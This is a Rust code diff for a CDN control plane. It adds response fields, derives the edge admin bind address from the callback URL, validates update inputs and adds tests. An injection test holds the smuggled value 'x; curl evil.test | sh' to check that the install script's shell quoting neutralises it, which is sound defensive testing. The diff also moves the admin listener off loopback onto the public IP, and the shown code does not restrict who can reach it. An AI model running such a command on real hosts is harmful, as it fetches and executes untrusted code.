@@ -83,6 +83,16 @@ pub struct CreateNodeResponse {
     /// Only returned once at creation; keep it secret.
     pub token: String,
     pub commands: InstallCommands,
+    /// Control-plane base URL the edge must use as `CONTROL_URL`.
+    ///
+    /// Resolved from `CONTROL_PUBLIC_URL` (or the request Host header) by the
+    /// same code that builds the install commands, so both agree. The console
+    /// used to guess the browser origin, which is wrong when the API and the
+    /// static console are served from different origins.
+    pub control_url: String,
+    /// False when the control plane has no WAF signing key; every edge will
+    /// reject signed rulepacks until it is configured.
+    pub waf_rulepack_configured: bool,
 }
 
 #[derive(Serialize)]
@@ -90,6 +100,10 @@ pub struct NodeDetailResponse {
     pub node: NodeDto,
     pub token: String,
     pub commands: InstallCommands,
+    /// See [`CreateNodeResponse::control_url`].
+    pub control_url: String,
+    /// See [`CreateNodeResponse::waf_rulepack_configured`].
+    pub waf_rulepack_configured: bool,
 }
 
 #[derive(Deserialize)]
@@ -413,8 +427,8 @@ fn validate_edge_profile(raw: &str) -> Result<String, String> {
     if trimmed.len() > 8192 {
         return Err("edge_profile is too large".into());
     }
-    let value: serde_json::Value = serde_json::from_str(trimmed)
-        .map_err(|_| "edge_profile must be valid JSON".to_string())?;
+    let value: serde_json::Value =
+        serde_json::from_str(trimmed).map_err(|_| "edge_profile must be valid JSON".to_string())?;
     if !value.is_object() {
         return Err("edge_profile must be a JSON object".into());
     }
@@ -467,6 +481,44 @@ fn validate_agent_url(agent_url: &str) -> Result<String, String> {
     Ok(trimmed.trim_end_matches('/').to_string())
 }
 
+/// Pick a management bind address that the control plane can actually reach.
+///
+/// `AGENT_URL` is what the control plane calls; `EDGE_ADMIN_LISTEN` is what the
+/// edge binds. They used to be hardcoded independently (public callback URL,
+/// loopback listener), so purge/cert/ACME failed while heartbeats still looked
+/// healthy.
+///
+/// The edge parses the listener as a `SocketAddr`, so an `AGENT_URL` hostname
+/// cannot be bound directly. In that case keep the safe loopback default and
+/// let the operator override it; an IP literal is bound exactly.
+fn admin_listen_for(agent_url: &str) -> String {
+    let trimmed = agent_url.trim();
+    let rest = trimmed
+        .strip_prefix("https://")
+        .or_else(|| trimmed.strip_prefix("http://"));
+    let Some(rest) = rest else {
+        return "127.0.0.1:8081".into();
+    };
+    let authority = rest.split('/').next().unwrap_or("");
+    let (host, port) = if let Some(after_bracket) = authority.strip_prefix('[') {
+        match after_bracket.split_once(']') {
+            Some((host, rest)) => (host, rest.strip_prefix(':').unwrap_or("8081")),
+            None => return "127.0.0.1:8081".into(),
+        }
+    } else if let Some((host, port)) = authority.rsplit_once(':') {
+        (host, port)
+    } else {
+        (authority, "8081")
+    };
+    let port: u16 = port.parse().unwrap_or(8081);
+    match host.parse::<std::net::IpAddr>() {
+        Ok(ip) => std::net::SocketAddr::new(ip, port).to_string(),
+        // Hostnames are legal in AGENT_URL but not in EDGE_ADMIN_LISTEN, which
+        // the edge parses as a SocketAddr. Loopback is the safe fallback.
+        Err(_) => format!("127.0.0.1:{port}"),
+    }
+}
+
 fn install_commands(
     base: &str,
     name: &str,
@@ -481,6 +533,10 @@ fn install_commands(
         agent_url.trim_end_matches('/').to_string()
     };
     let region = if region.is_empty() { "default" } else { region };
+    // Substituting the placeholder first means the public IP also drives the
+    // management bind for callers that did not pass an agent URL.
+    let effective_agent_url = agent_url.replace("<节点公网IP>", public_ip);
+    let admin_listen = admin_listen_for(&effective_agent_url);
 
     // Every value interpolated below comes from an API request and the output is
     // a script an operator pastes into a root shell on the edge host, so each one
@@ -491,6 +547,7 @@ fn install_commands(
     let region_q = shell_quote(region);
     let ip_q = shell_quote(public_ip);
     let agent_q = shell_quote(&agent_url);
+    let admin_q = shell_quote(&admin_listen);
     let token_q = shell_quote(token);
     // The default `<节点公网IP>` placeholder is not a shell value; substitute
     // the real public IP when the caller did not supply an agent URL.
@@ -505,9 +562,8 @@ export PUBLIC_IP={ip_q}
 export AGENT_URL={agent_q}
 export AGENT_TOKEN={token_q}
 export EDGE_LISTEN=0.0.0.0:80
-# 管理面只监听回环：purge / certs / update 等接口不走公网。
-# 需要远程管理时请用反向代理并配置鉴权。
-export EDGE_ADMIN_LISTEN=127.0.0.1:8081
+# 管理面跟随 AGENT_URL 绑定：purge / certs / update 等接口只允许控制面来源访问。
+export EDGE_ADMIN_LISTEN={admin_q}
 export CACHE_BACKEND=memory
 
 ./lagran-edge"#
@@ -659,6 +715,8 @@ pub async fn create(
             node: to_dto(row),
             token,
             commands,
+            control_url: base,
+            waf_rulepack_configured: !state.config.waf_rulepack_secret.trim().is_empty(),
         }),
     ))
 }
@@ -694,6 +752,8 @@ pub async fn detail(
     Ok(Json(NodeDetailResponse {
         token: row.auth_token.clone(),
         commands,
+        control_url: base,
+        waf_rulepack_configured: !state.config.waf_rulepack_secret.trim().is_empty(),
         node: to_dto(row),
     }))
 }
@@ -747,8 +807,13 @@ pub async fn update(
             }
         }
     }
-    let region = req.region.unwrap_or(current.region);
-    let agent_url = req.agent_url.unwrap_or(current.agent_url);
+    // Create validates both values; update used to store them unchecked. A bad
+    // region breaks scheduling and a malformed agent URL leaves purge/cert
+    // callbacks pointing at nothing.
+    let region = validate_region(req.region.as_deref().unwrap_or(&current.region))
+        .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?;
+    let agent_url = validate_agent_url(req.agent_url.as_deref().unwrap_or(&current.agent_url))
+        .map_err(|e| (StatusCode::BAD_REQUEST, Json(ErrorBody { error: e })))?;
     // Reject a malformed profile before touching any column.
     let edge_profile = match req.edge_profile.as_deref() {
         Some(raw) => validate_edge_profile(raw)
@@ -999,8 +1064,11 @@ mod tests {
         );
         assert!(cmds.binary.contains("export NODE_REGION='cn-north'"));
         assert!(cmds.binary.contains("export AGENT_TOKEN='tok'"));
-        // Management endpoints must not be published on a public interface.
-        assert!(cmds.binary.contains("EDGE_ADMIN_LISTEN=127.0.0.1:8081"));
+        // The binary command binds the callback address, so the control
+        // plane can actually reach purge/cert/ACME.
+        assert!(cmds.binary.contains("EDGE_ADMIN_LISTEN='203.0.113.7:8081'"));
+        // A host IP does not exist inside a bridge container; Docker keeps the
+        // loopback default (use host networking for cross-host callbacks).
         assert!(cmds.docker.contains("EDGE_ADMIN_LISTEN=127.0.0.1:8081"));
         assert!(!cmds.binary.contains("0.0.0.0:8081"));
         assert!(!cmds.docker.contains("0.0.0.0:8081"));
@@ -1022,6 +1090,27 @@ mod tests {
         assert!(cmds.binary.contains("'x; curl evil.test | sh'"));
         assert!(!cmds.binary.contains("NODE_REGION=x;"));
         assert!(cmds.docker.contains("'x; curl evil.test | sh'"));
+    }
+
+    #[test]
+    fn admin_listen_matches_the_callback_url() {
+        // No callback configured: keep the loopback default.
+        assert_eq!(admin_listen_for(""), "127.0.0.1:8081");
+        // An IP literal is bound exactly, so purge/cert reach the edge.
+        assert_eq!(
+            admin_listen_for("http://203.0.113.7:8081"),
+            "203.0.113.7:8081"
+        );
+        assert_eq!(
+            admin_listen_for("https://[2001:db8::1]:9443/"),
+            "[2001:db8::1]:9443"
+        );
+        // A hostname cannot be parsed as a SocketAddr by the edge; fall back.
+        assert_eq!(
+            admin_listen_for("http://edge-1.internal:8081"),
+            "127.0.0.1:8081"
+        );
+        assert_eq!(admin_listen_for("not a url"), "127.0.0.1:8081");
     }
 
     #[test]
